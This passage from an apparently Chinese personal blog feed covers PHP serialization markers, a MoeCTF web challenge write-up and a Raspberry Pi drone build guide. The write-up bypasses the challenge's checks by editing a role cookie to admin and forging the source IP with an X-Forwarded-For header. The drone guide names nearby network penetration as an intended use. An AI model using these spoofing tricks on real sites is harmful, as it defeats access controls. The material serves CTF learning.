分别表示对象引用和指针引用，这两个也比较有用，在序列化比较复杂的数组和对象时就会产生带有这两个标示的数据，后面我们将详细讲解这两个标示，目前这两个标示尚没有发现有其他语言的实现。</p><p>C 是 PHP5 中引入的，它表示自定义的对象序列化方式，尽管这对于其它语言来说是没有必要实现的，因为很少会用到它，但是后面还是会对它进行详细讲解的。</p><p>U 是 PHP6 中才引入的，它表示 Unicode 编码的字符串。因为 PHP6 中提供了 Unicode 方式保存字符串的能力，因此它提供了这种序列化字符串的格式，不过这个类型 PHP5、PHP4 都不支持，而这两个版本目前是主流，因此在其它语言实现该类型时，不推荐用它来进行序列化，不过可以实现它的反序列化过程。在后面我也会对它的格式进行说 明。</p><p>最后还有一个 o，这也是我唯一还没弄清楚的一个数据类型标示。这个标示在 PHP3 中被引入用来序列化对象，但是到了 PHP4 以后就被 O 取代了。在 PHP3 的源代码中可以看到对 o 的序列化和反序列化与数组 a 基本上是一样的。但是在 PHP4、PHP5 和 PHP6 的源代码中序列化部分里都找不到它的影子，但是在这几个版本的反序列化程序源代码中却都有对它的处理，不过把它处理成什么我还没弄清楚。因此对它暂时不再 作更多说明了。<br>补充</p><p>最近的 PHP CVS 版本中，序列化的方式有所变化，基本类型的序列化仍然保持原来的格式，只是对 Unicode 支持上，有了新的进展。另外，对普通字符串的序列化也分成了 2 种。一种是 non-escaped 字符串，也就是我们上面说的那个小写 s 标识的字符串；另一种是 escaped 字符串，这种字符串格式用大写 S 标识。所以上面那个表现在应该改为：</p><pre><code>    a - array    b - boolean    d - double    i - integer    o - common object    r - reference    s - non-escaped binary string    S - escaped binary string    C - custom object</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> DgutCTF </category>
          
          <category> Web </category>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web-http</title>
      <link href="/2023/09/05/http/"/>
      <url>/2023/09/05/http/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p><img src="/images/http1.JPG"><br>满足题目的5点要求即可得到flag</p><h1 id="使用Postman"><a href="#使用Postman" class="headerlink" title="使用Postman"></a>使用Postman</h1><p>要满足这些要求，有一个十分好用的工具叫postman，它是一个浏览器插件，也有exe的版本，这里我选用了exe版本的postman</p><h2 id="使用post请求"><a href="#使用post请求" class="headerlink" title="使用post请求"></a>使用post请求</h2><p>直接修改postman的设置，如图：<br><img src="/images/httppost.JPG"></p><h2 id="满足use-parameter-UwU-u"><a href="#满足use-parameter-UwU-u" class="headerlink" title="满足use parameter: UwU&#x3D;u"></a>满足use parameter: UwU&#x3D;u</h2><p>在postman的params一栏里设置，也可以直接在网站后面加：<br><img src="/iamges/httpparam.JPG"></p><h2 id="满足post-form-Luv-u"><a href="#满足post-form-Luv-u" class="headerlink" title="满足post form: Luv&#x3D;u"></a>满足post <strong>form</strong>: Luv&#x3D;u</h2><p>这里要求post from-data格式或者x-www-from-urlencoded格式的数据，并且满足Luv&#x3D;u，如图：</p><h2 id="满足use-admin-character"><a href="#满足use-admin-character" class="headerlink" title="满足use admin character"></a>满足use admin character</h2><p>这里可以通过修改cookies来达成，任意post一次后会返回cookie：<br><img src="/images/httpck1.JPG"><br>然后将鼠标停在cookie一栏，点击go to cookie，进入界面后点击character，将character&#x3D;guest改成character&#x3D;admin<br><img src="/images/httpck2.JPG"><br>然后点击save</p><h2 id="满足request-from-127-0-0-1"><a href="#满足request-from-127-0-0-1" class="headerlink" title="满足request from 127.0.0.1"></a>满足request from 127.0.0.1</h2><p>当时我想了很久，因为我就是用127.0.0.1的ip来post的，但是不行，进而想到伪造ip，查了很久发现在请求头加入x-forwarded-for&#x3D;127.0.0.1一条可以伪造ip，于是添加：<br><img src="/images/httpfake.JPG"></p><hr><p>将127.0.0.1改成其他也可以伪造成其他ip</p><hr><h2 id="满足use-browser-‘MoeBrowser’"><a href="#满足use-browser-‘MoeBrowser’" class="headerlink" title="满足use browser ‘MoeBrowser’"></a>满足use browser ‘MoeBrowser’</h2><p>很简单，修改header的user-agent就可以了：<br><img src="/images/httpbro.JPG"></p><h1 id="post得到flag"><a href="#post得到flag" class="headerlink" title="post得到flag"></a>post得到flag</h1><p>直接点击右上角的send，发送后得到flag：<br><img src="/images/httpflag.JPG"></p><h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><p>1.这个伪造ip的方法当时真的不会，看到很多人做出来甚至有点怀疑自己</p><hr><p>这是在莞工写的第一篇write up，草草写了篇简单的，就当纪念吧</p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自制树莓派无人机</title>
      <link href="/2023/09/01/drone/"/>
      <url>/2023/09/01/drone/</url>
      
        <content type="html"><![CDATA[<h1 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h1><p>灵感来源于watch dogs里面的黑客无人机，以树莓派+pixhawk为主体，搭载大疆F450机架，配以2000毫安锂电池，可以凭借pixhawk出色的飞控能力，以及树莓派优秀的运算能力，在空中完成近源渗透，人脸识别，数据转发（星链），无人机送货等多项功能。</p><hr><p>注意：建议先给pixhawk和树莓派刷入固件，调试好各项参数（根据情况可以无线调试，建议先调试完可以无线调试的项目），再组装飞机（gps，电机电调调试必须先组装好飞机），不一定要按照文章顺序来做</p><hr><h1 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h1><p>大概要这些<br><img src="/images/dronemt1.jpg"></p><h2 id="F450机架（动力套装）"><a href="#F450机架（动力套装）" class="headerlink" title="F450机架（动力套装）"></a>F450机架（动力套装）</h2><p>如果懂得焊接可以更自由的购买电机电调来组装，不懂焊接的建议直接咸鱼（淘宝上很少或者没有组装好的）买F450的动力套装，因为动力套装插上飞控就可以操作，不需焊接，购买前请注意是否真的不需要焊接。<br><img src="/images/djijia1.jpg"><br><img src="/images/djijia2.jpg"></p><h2 id="减震板"><a href="#减震板" class="headerlink" title="减震板"></a>减震板</h2><p>用于给pixhawk和树莓派减震，不同的机架组装方式会有不同的减震组装方案，对飞机的保护起重要作用。<br><img src="/images/dprotect.jpg"></p><h2 id="电池"><a href="#电池" class="headerlink" title="电池"></a>电池</h2><p>2000毫安4S足够了，电池尺寸长155mm<em>宽45mm</em>高28mm已经很极限了，建议买以下这种款式的电池<br><img src="/images/dbattery.jpg"></p><h2 id="机载电脑（树莓派或其他嵌入式开发设备）"><a href="#机载电脑（树莓派或其他嵌入式开发设备）" class="headerlink" title="机载电脑（树莓派或其他嵌入式开发设备）"></a>机载电脑（树莓派或其他嵌入式开发设备）</h2><p>经费足够所以采用了8G树莓派4b做机载电脑，记载电脑建议配套散热措施<br><img src="/images/draspi.jpg"></p><h2 id="pixhawk套件（也可其他飞控但pixhawk配件较为齐全）"><a href="#pixhawk套件（也可其他飞控但pixhawk配件较为齐全）" class="headerlink" title="pixhawk套件（也可其他飞控但pixhawk配件较为齐全）"></a>pixhawk套件（也可其他飞控但pixhawk配件较为齐全）</h2><p>经费足够所以购买了全套的pixhawk套件，包括M8NGPS以及支架，电流计，pixhawk飞控，减震板<br><img src="/images/dpixhawk.jpg"></p><h2 id="游戏手柄（或遥控器）"><a href="#游戏手柄（或遥控器）" class="headerlink" title="游戏手柄（或遥控器）"></a>游戏手柄（或遥控器）</h2><p>买个便宜的就行，游戏手柄可以连接手机，手机4g控制无人机，没有距离限制，但对网络稳定性有要求。遥控器稳定性会比4g好，但是控制距离十分有限，而且要额外加装接收机。<br><img src="/images/dxbox.jpg"></p><h2 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h2><p>购买十几块钱的树莓派配套摄像头（或者其他机载电脑的配套摄像头）<br><img src="/images/dcam.jpg"></p><h2 id="随身WIFI"><a href="#随身WIFI" class="headerlink" title="随身WIFI"></a>随身WIFI</h2><p>随身WIFI用于树莓派上网，也可以用4g模块，但随身WIFI可以插手机卡，而且可以很方便的插入usb口<br><img src="/images/dwifi.jpg"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>锂电池T插转usb，锂电池T插一公分二母，平衡充，BB响，3M胶或者强力双面胶若干，扎带若干，魔术贴带子一条，无线网卡（渗透用）……可以根据需要设计模块来购买，任君想象，任君选择</p><h2 id="购物清单"><a href="#购物清单" class="headerlink" title="购物清单"></a>购物清单</h2><p>这里是我为项目购买的所有东西，供参考<br><img src="/images/dsplist1.jpg"><br><img src="/images/dsplist2.jpg"><br><img src="/images/dsplist3.jpg"><br><img src="/images/dsplist4.jpg"><br><img src="/images/dsplist5.jpg"><br><img src="/images/dsplist6.jpg"><br><img src="/images/dsplist7.jpg"><br><img src="/images/dsplist8.jpg"><br><img src="/images/splist9.jpg"><br><img src="/images/dsplist10.jpg"><br><img src="/images/dsplist11.jpg"><br><img src="/images/dsplist12.jpg"><br><img src="/images/dsplist13.jpg"><br><img src="/images/dsplist14.jpg"><br><img src="/images/dsplist15.jpg"></p><h1 id="硬件组装"><a href="#硬件组装" class="headerlink" title="硬件组装"></a>硬件组装</h1><h2 id="机架焊接（如果不用焊接可以跳过）"><a href="#机架焊接（如果不用焊接可以跳过）" class="headerlink" title="机架焊接（如果不用焊接可以跳过）"></a>机架焊接（如果不用焊接可以跳过）</h2><p>第一步：底板焊接</p><p>   将4个电调，XT60电源线，和2根JST公头线如图所示焊接在底板上。如下所示：</p><p><img src="/images/dronef1.jpg"></p><p>注意：</p><p>1.电调与底板之间的焊点不能虚焊。飞行器启动后电流比较大，虚焊会导致发热严重并脱落，造成飞行中的严重事故！</p><p>2.前后四个焊点（上图）不能太大，否则会阻挡以后电池的安装。</p><p>3.JST公头线作为预留给云台和图传供电的接口。以往的教程没有提及这点，在后期加装云台图传时稍显不便，需要重新焊接电源线比较麻烦。</p><p>焊点要光滑饱满，焊锡覆盖整个焊点和接线。焊接好以后用手拖拽测试是否牢固。</p><p>第二步：电机香蕉头焊接和套上热缩管</p><p>  很多电机出厂都没有焊接香蕉头，需要自己焊接。香蕉头焊接也是组装过程中一个重要的地方。香蕉头焊接不好，通电后会导致电机缺相烧毁。</p><p>  香蕉头用纸巾包裹好，夹在老虎钳上。用纸巾的目的是防止焊锡里面的松香融化后流到插头部分，会造成接触不好。焊接时先将焊锡融入香蕉头内并填满，然后再插入电机线。如下图所示：</p><p><img src="/images/dronef2.jpg"></p><p>  焊接好冷却后，用手拖拽测试是否牢固。</p><p>   确认没有问题，就可以将热宿管套上，用热风枪或则电吹风高温档或则打火机，吹烤包裹部分。使其紧贴。如下所示：</p><p><img src="/images/dronef3.jpg"></p><p><img src="/images/dronef4.jpg"></p><p>2812电机焊接好香蕉头如下：</p><p><img src="/images/dronef5.jpg"></p><h2 id="机架组装"><a href="#机架组装" class="headerlink" title="机架组装"></a>机架组装</h2><p>1.将电机固定在机臂上。注意：用机架里面配套的银色大螺丝安装电机。如下所示：</p><p><img src="/images/dronef6.jpg"></p><p>2.用机架里面的银色小螺丝将机臂固定在底板上，螺丝先不用拧得太紧，方便后面调节，如下图:</p><p><img src="/images/dronef7.jpg"></p><p><img src="/images/dronef8.jpg"></p><p>注意：银色头电机和黑色头电机的安装位置不能装错！！！</p><p>银色电机螺帽是反丝，以后是顺时针旋转；黑色电机螺帽是正丝，以后是逆时针旋转，这样安装以后才不会射桨！</p><ol start="3"><li>安装机架上板</li></ol><p><img src="/images/dronef9.jpg"></p><p>4.上板安装好以后，再拧紧底板螺丝！紧固所有螺丝。</p><p>5.连接电机与电调</p><p>将电机焊接好的香蕉头分别插到电调的3个香蕉头里面</p><p>注意：先任意连接。要无人机正常飞行对电机的旋转方向是有要求的。但做到这步电机还无法启动，等后面飞控调试好以后，我们再来调整电机的旋转方向。</p><p><img src="/images/dronef10.jpg"></p><p>四个电机和电调都要分别接好。</p><h2 id="安装飞控以及机载电脑（两种减震方案）"><a href="#安装飞控以及机载电脑（两种减震方案）" class="headerlink" title="安装飞控以及机载电脑（两种减震方案）"></a>安装飞控以及机载电脑（两种减震方案）</h2><p>首先先将减震板组装好，两种减震方案都需要先将减震板这样安装好：<br>先把减震板和减震球组装好，小技巧：先将减震球安装于小板上，然后再连接大板。注意：减震球不可用尖锐的工具安装，减震球破损后就没有减震的功能了。（小球硬塞进去）</p><p><img src="/images/diprotect1.jpg"></p><p>取一块3M胶，将减震板粘在机架上板中心。可在四个角用尼龙扎带绑扎一下，进一步加固减震板。</p><p><img src="/images/diprotect2.jpg"></p><p><img src="/images/diprotect3.jpg"><br>然后，在减震板上方也贴上胶：<br><img src="/images/diprotect4.jpg"></p><h3 id="第一种（材料少，美观，对机载电脑的保护性更好，成本高）"><a href="#第一种（材料少，美观，对机载电脑的保护性更好，成本高）" class="headerlink" title="第一种（材料少，美观，对机载电脑的保护性更好，成本高）"></a>第一种（材料少，美观，对机载电脑的保护性更好，成本高）</h3><p>先将机载电脑贴在减震板上，树莓派4b要将usb口朝向机头（即机架红色臂的方向）随后在机载电脑上用螺丝安装一块装载飞控的塑胶板，再将飞控贴在塑胶板上（飞控箭头方向为机头方向），塑胶板的3D打印文件在下方给出，这个方案贵就贵在这个3d打印板，普遍要50+一块<br><img src="/images/d3dprint.jpg"><br><a href="/files/3dprint.stl">飞控装载板（点击下载）</a></p><h3 id="第二种（材料体积大，不太美观，对飞控板的保护性更好，对机载电脑的减震效果不太好，成本稍微便宜）"><a href="#第二种（材料体积大，不太美观，对飞控板的保护性更好，对机载电脑的减震效果不太好，成本稍微便宜）" class="headerlink" title="第二种（材料体积大，不太美观，对飞控板的保护性更好，对机载电脑的减震效果不太好，成本稍微便宜）"></a>第二种（材料体积大，不太美观，对飞控板的保护性更好，对机载电脑的减震效果不太好，成本稍微便宜）</h3><p>按照第一种的方法，不过是先将飞控板安装在减震板上，然后再加装上文购物清单中的碳钎维扩展版，再将机载电脑装载在扩展版上</p><hr><p>我的成品一开始采用的是方案一，后来操作不当炸机后因为经费不足，改用了方案二，实测两种方案对飞行影响不大，不过个人更喜欢方案一</p><hr><h2 id="安装GPS支架，蜂鸣器，安全开关等"><a href="#安装GPS支架，蜂鸣器，安全开关等" class="headerlink" title="安装GPS支架，蜂鸣器，安全开关等"></a>安装GPS支架，蜂鸣器，安全开关等</h2><p>这些的安装十分简单，用扎带和胶等工具固定即可。需要注意的是，GPS支架有高矮两种，建议选择高的那种，我的成品一开始也是选高款，但炸机之后我就选了矮款（轻信了淘宝商家的“防屏蔽”，其实感觉没啥用）以下附上成品关于这些细节的图片：<br><img src="/images/droneok1.jpg"><br><img src="/images/droneok2.jpg"><br><img src="/images/droneok3.jpg"><br><img src="/images/droneok4.jpg"><br><img src="/images/droneok5.jpg"><br><img src="/images/droneok6.jpg"><br><img src="/images/droneok7.jpg"><br>（图片拍的不好请见谅，但足够清晰，可以使用）<br>注意图中没有安装bb响，bb响的安装要求锂电池引出的pin从左到右插入bb响（或者从右到左，不记得了，都试试吧），树莓派采用的是锂电池T插转usb供电（注意输出电压，不然会烧坏树莓派）</p><h2 id="Pixhawk的连接"><a href="#Pixhawk的连接" class="headerlink" title="Pixhawk的连接"></a>Pixhawk的连接</h2><p>像蜂鸣器，安全开关，gps等都要与pixhawk连接，具体的连接如下：</p><table><thead><tr><th align="center">器件</th><th align="center">pixhawk接口1</th><th align="center">pixhawk接口2</th></tr></thead><tbody><tr><td align="center">蜂鸣器</td><td align="center">buzzer</td><td align="center">——</td></tr><tr><td align="center">安全开关</td><td align="center">switch</td><td align="center">——</td></tr><tr><td align="center">GPS</td><td align="center">GPS</td><td align="center">I2C</td></tr><tr><td align="center">6pin线数传（连接机载电脑）</td><td align="center">telem 2</td><td align="center">——</td></tr><tr><td align="center">电流计</td><td align="center">power</td><td align="center">——</td></tr></tbody></table><h2 id="电调与飞控的连接"><a href="#电调与飞控的连接" class="headerlink" title="电调与飞控的连接"></a>电调与飞控的连接</h2><p>这里直接摘录：<br>按照下图上面的电机标识，将电机对应的电调连接到飞控主要输出口（main out）1<del>4通道。电调线从机臂之间穿过到飞控后方。注意：main out接口是从右边开始第7针脚开始（前面是AUX1</del>AUX6辅助接口）</p><p>电调连接飞控的顺序不能接错。否则会导致飞机解锁推油门就翻跟斗。</p><p><img src="/images/dfpow1.jpg"></p><p><img src="/images/dfpow2.jpg"></p><p>和S500机架的接线一样，注意黑色负极在上，白色信号在下：</p><p><img src="/images/dfpow3.jpg"><br>下面再附上一张跟桨动力有关的图片，方便理解与调试：<br>正桨—CCW—逆时针旋转 反桨—CW—顺时针旋转<br>判断方法一：用桨叶迎风面区分正反桨：螺旋桨横着放，桨叶有字的一面向上，右边桨叶的迎风面在后面的是正桨，右边桨叶的迎风面在前面的是反桨。<br>判断方法二：桨叶平放，左高右低为反桨，反之为正桨<br><img src="/images/dfpow4.jpg"></p><h2 id="飞控与机载电脑连接（以树莓派为例）"><a href="#飞控与机载电脑连接（以树莓派为例）" class="headerlink" title="飞控与机载电脑连接（以树莓派为例）"></a>飞控与机载电脑连接（以树莓派为例）</h2><p>通过pixhawk侧边的micro-usb与树莓派的usb连接是最方便最稳定的，但是usb线不够美观而且很占位置，于是我采用了serial串口连接方式，以下给出树莓派接口图和pixhawk数传的接口图<br>树莓派：<br><img src="/images/draspisport.png"><br>图片下方是树莓派USB接口的朝向<br>pixhawk：<br><img src="/images/dpixhawksp.jpg"><br>pixhawk的图可能有点看不清，解释一下：telem2口右6个pin，pixhawk箭头朝下，telem从左往右数前三个分别是：5V，Tx，Rx 最右边的是Ground。在连接时，如果pixhawk连接了电流计，则不需要将5V供电和Ground连接树莓派，如果没有连接电流计，则需要将5V和Ground连接树莓派，让树莓派给pixhawk供电。连接时，将pixhawk的5V和树莓派的5V连接，将Ground与Ground连接，将pixhawk的Tx与树莓派的Rx连接，将pixhawk的Rx与树莓派的Tx连接（图片中的连接方式是错的）</p><h2 id="摄像头与树莓派连接"><a href="#摄像头与树莓派连接" class="headerlink" title="摄像头与树莓派连接"></a>摄像头与树莓派连接</h2><p>将摄像头相机朝向树莓派usb口的方向(金手指朝着typec口，即与usb口反向），缕直摄像头的数据线，直接将金手指插入树莓派靠近usb口的那个插摄像头的接口（大力出奇迹）</p><h1 id="软件设置"><a href="#软件设置" class="headerlink" title="软件设置"></a>软件设置</h1><h2 id="烧录pixhawk"><a href="#烧录pixhawk" class="headerlink" title="烧录pixhawk"></a>烧录pixhawk</h2><p>在以下网址下载mission planner到电脑：<br><a href="https://ardupilot.org/planner/docs/mission-planner-installation.html">https://ardupilot.org/planner/docs/mission-planner-installation.html</a><br>打开mission planner后，将烧录好的sd卡（4G以上，FAT32格式）插入pixhawk的卡槽内，将pixhawk通过usb线连接电脑。点击初始设置-安装固件-All Options 记住上方相应飞机的最新支持版本（例如copter v4.4.0）<br><img src="/images/dmp.JPG"><br>在跳出的弹窗里最上一栏版本选择相应的版本，platform选择Pixhawk 1，下面version选择与最上一栏相应的，最下面firmware选择相应的apj文件（比如我选择的是copter）<br><img src="/images/dmpfirm.JPG"><br>这套配置适合pixhawk2.4.8的硬件使用<br>最后点击upload firmware上传固件到pixhawk</p><h3 id="离线烧录"><a href="#离线烧录" class="headerlink" title="离线烧录"></a>离线烧录</h3><p>可能有时会因为网路问题无法联网烧录，可以选择load costume firmware加载本地固件，文件我放在下面：<br><a href="/files/firmware.apj">离线固件（点击下载）</a></p><h2 id="烧录树莓派"><a href="#烧录树莓派" class="headerlink" title="烧录树莓派"></a>烧录树莓派</h2><p>在网上下载树莓派官方烧录工具：<a href="https://www.raspberrypi.com/software/">https://www.raspberrypi.com/software/</a><br>根据树莓派的不同，选择相应位数的带桌面版本的pi os镜像，（可以在官方烧录工具中联网烧录，也可以使用本地镜像，如果使用本地镜像，先到给出网址下载相应镜像文件）我购买的8G树莓派，可以选择64位的镜像：<a href="https://www.raspberrypi.com/software/operating-systems/">https://www.raspberrypi.com/software/operating-systems/</a><br>找一张32G以上的sd卡，使用官方烧录软件格式化（选择操作系统-擦除），格式化后，选择相应系统，先别急着烧录，在烧录界面找到一个高级设置之类的东西，将树莓派初始的账户，连接WiFi等设置好再烧录，不然可能出现无法登录，无法联网等问题（无法连接wifi还可以接网线后ssh，进入桌面连接wifi，但无法登录只能重新烧录）<br>烧录完成后将sd卡插入树莓派卡槽，给树莓派上电开机，如果树莓派红灯常亮，绿灯不定时闪烁则正常启动。</p><h2 id="设置树莓派"><a href="#设置树莓派" class="headerlink" title="设置树莓派"></a>设置树莓派</h2><p>ssh进入树莓派，敲入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo raspi-config #这个config还可以改很多东西，比如修改分配给相机的内存大小，或者优化性能</span><br></pre></td></tr></table></figure><p>在出来的界面选择interface options，将Legacy camera打开，将vnc打开，进入serial port，将通过serial登录shell关闭，将serial port hardware打开，然后树莓派会询问是否要重启，先不要重启，修改&#x2F;boot&#x2F;config.txt，在末尾加上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enable_uart=1</span><br><span class="line">dtoverlay=disable-bt</span><br></pre></td></tr></table></figure><p>保存修改后重启树莓派</p><h3 id="安装motion以及飞控软件"><a href="#安装motion以及飞控软件" class="headerlink" title="安装motion以及飞控软件"></a>安装motion以及飞控软件</h3><p>在树莓派上执行以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install motion python3 python3-dev python3-opencv python3-wxgtk4.0 python3-pip python3-matplotlib python3-lxml python3-pygame</span><br><span class="line">pip3 install PyYAML mavproxy --user</span><br><span class="line">echo &#x27;export PATH=&quot;$PATH:$HOME/.local/bin&quot;&#x27; &gt;&gt; ~/.bashrc #这一行我印象中没用过，算式非必要？</span><br></pre></td></tr></table></figure><p>安装好motion后，将树莓派&#x2F;etc&#x2F;motion&#x2F;motion.conf文件中的内容改成以下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Rename this distribution example file to motion.conf</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># This config file was generated by motion 4.5.1</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Documentation:  /usr/share/doc/motion/motion_guide.html</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># This file contains only the basic configuration options to get a</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">system working.  There are many more options available.  Please</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">consult the documentation <span class="keyword">for</span> the complete list of all options.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"></span><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">System control configuration parameters</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Start <span class="keyword">in</span> daemon (background) mode and release terminal.</span></span><br><span class="line">daemon on</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Start <span class="keyword">in</span> Setup-Mode, daemon disabled.</span></span><br><span class="line">setup_mode off</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">File to store the process ID.</span></span><br><span class="line">; pid_file value</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">File to write logs messages into.  If not defined stderr and syslog is used.</span></span><br><span class="line">log_file /var/log/motion/motion.log</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Level of <span class="built_in">log</span> messages [1..9] (EMG, ALR, CRT, ERR, WRN, NTC, INF, DBG, ALL).</span></span><br><span class="line">log_level 6</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Target directory <span class="keyword">for</span> pictures, snapshots and movies</span></span><br><span class="line">target_dir /var/lib/motion</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Video device (e.g. /dev/video0) to be used <span class="keyword">for</span> capturing.</span></span><br><span class="line">video_device /dev/video0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Parameters to control video device.  See motion_guide.html</span></span><br><span class="line">; video_params value</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The full URL of the network camera stream.</span></span><br><span class="line">; netcam_url value</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Name of mmal camera (e.g. vc.ril.camera <span class="keyword">for</span> pi camera).</span></span><br><span class="line">; mmalcam_name value</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Camera control parameters (see raspivid/raspistill tool documentation)</span></span><br><span class="line">; mmalcam_params value</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################################</span></span></span><br><span 